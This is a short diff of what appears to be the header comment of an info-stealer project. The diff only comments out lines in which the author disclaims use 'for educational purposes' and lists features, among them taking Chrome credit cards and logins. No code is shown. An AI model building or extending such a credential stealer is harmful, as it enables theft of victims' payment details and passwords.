@@ -1,7 +1,7 @@
 # messy code cus i added alot overtime
-written by xylo#6666 dont skid xD
-i wrote this solely for educational purposes and do not use it myself nor do i remommend u do
-features:
+# written by xylo#6666 dont skid xD
+# i wrote this solely for educational purposes and do not use it myself nor do i remommend u do
+# features:
     chrome:
         credit cards
         logins
